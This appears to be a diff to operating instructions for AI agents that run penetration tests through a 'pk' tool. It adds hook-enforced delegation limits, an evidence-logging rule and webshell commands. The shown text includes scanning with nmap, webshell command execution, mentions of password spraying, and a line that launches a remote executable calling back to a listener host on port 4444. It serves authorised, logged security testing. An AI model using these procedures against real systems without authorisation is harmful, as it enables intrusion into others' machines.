@@ -90,10 +90,11 @@ back after completing the task or after 200 tool calls, whichever comes first. I
 after 3 failed attempts at the same approach, report what you tried and ask for
 redirection."
 
-**Delegation heuristic.** If you have been running tools directly (curl, nmap, relay
-scripts, password spraying) for more than 15 minutes without delegating, stop and spawn
-an agent. Orchestrator context is expensive; filling it with raw tool output causes
-investigation loops.
+**Delegation heuristic (enforced by hook).** After 10 inline target-facing commands
+(pk exec, pkx, docker exec, webshell curl), the PreToolUse hook warns. At 20, it blocks.
+Do NOT run tools directly for extended periods. Spawn an agent after at most 10 inline
+commands. Orchestrator context is expensive; filling it with raw tool output causes
+investigation loops. The counter resets at session start.
 
 ## Agent brief template
 
@@ -109,6 +110,8 @@ When spawning a sub-agent, include these sections in the brief:
 4. **Constraints**: tool call budget (default 200), forbidden actions (do not brute-force,
    do not modify service X), and any RoE limits.
 5. **Report format**: what to report back (findings, credentials, flags, evidence paths).
+6. **Evidence requirement**: "Every confirmed finding MUST have at least one `pk evidence
+   add` linking proof. Zero evidence = failed engagement discipline."
 
 Do not include phase-advancement instructions; the supervisor handles that
 automatically.
@@ -184,7 +187,13 @@ pk agent finish <runId> --status <ok|failed> --summary "..."
 # Exec (run tool commands with auto-logging and output truncation)
 pk exec -- nmap -Pn -sT 10.0.0.1  # auto-logs, truncates output >4KB, stores full output
 pk exec --reason "checking for open web ports" -- nmap -p 80,443 10.0.0.1
+pkx nmap -Pn -sT 10.0.0.1         # shortcut for pk exec --
 pk search "flag"                   # grep stored exec outputs
+
+# Webshell sessions (auto-logged like pk exec)
+pk webshell register <url> [--name <name>] [--param cmd]
+pk webshell exec <name-or-url> <command>
+pk webshell list
 
 # Inbox
 pk msg send --body "<reply>"
@@ -258,8 +267,10 @@ pk shell exec mysession "C:\ProgramData\Microsoft\update.exe -H <lhost> -p 4444 
 - **Intentional piping only.** Piping to filter large output is good (`grep open` on nmap
   results). Piping unrelated commands together is bad (`cat flag.txt | ls`). Each step in a
   pipe should serve the same objective.
-- **Attackbox tools** (nmap, ffuf, sqlmap, etc.): `pk exec -- <command>`. Auto-logs to
-  activity. Do not use raw `docker exec`.
+- **Attackbox tools** (nmap, ffuf, sqlmap, etc.): `pk exec -- <command>` (or `pkx <command>`).
+  Auto-logs to activity. Raw `docker exec` is **blocked by hook**.
+- **Webshell commands**: `pk webshell exec <name> <command>`. Auto-logs like pk exec.
+  Do not use raw `docker exec attackbox curl` for webshell interaction.
 - **Target interaction** via gleipnir sessions: `pk shell exec <session> <command>` for
   commands on the target, `pk upload`/`pk download` for file transfer, `pk tunnel` for
   SOCKS pivoting. These also auto-log to activity.
